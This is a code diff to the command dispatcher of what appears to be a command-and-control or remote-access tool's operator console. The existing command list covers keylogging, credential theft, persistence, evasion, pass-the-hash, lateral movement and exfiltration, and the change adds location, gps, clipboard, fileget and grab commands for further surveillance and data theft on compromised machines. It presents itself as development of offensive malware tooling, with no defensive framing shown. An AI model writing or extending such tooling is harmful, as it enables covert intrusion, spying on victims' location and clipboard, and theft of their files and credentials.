@@ -1531,7 +1531,7 @@ async function sendTermCmd() {
   let cmd = parts[0].toLowerCase(), args = parts.slice(1).join(' ');
 
   if (['shell','exec','cmd'].includes(cmd)) { cmd = 'shell'; }
-  else if (!['sysinfo','ifconfig','ipconfig','ps','screenshot','download','upload','persist','sleep','cd','kill','evasion','token','keylog','socks','portfwd','creds','pivot','lateral','wmiexec','winrm','psexec','pth','exfil','assembly','ad','initaccess','portscan','spray','netdiscover'].includes(cmd) && !cmd.startsWith('ad-')) {
+  else if (!['sysinfo','ifconfig','ipconfig','ps','screenshot','download','upload','persist','sleep','cd','kill','evasion','token','keylog','socks','portfwd','creds','pivot','lateral','wmiexec','winrm','psexec','pth','exfil','assembly','ad','initaccess','portscan','spray','netdiscover','location','gps','clipboard','fileget','grab'].includes(cmd) && !cmd.startsWith('ad-')) {
     args = raw; cmd = 'shell';
   }
 
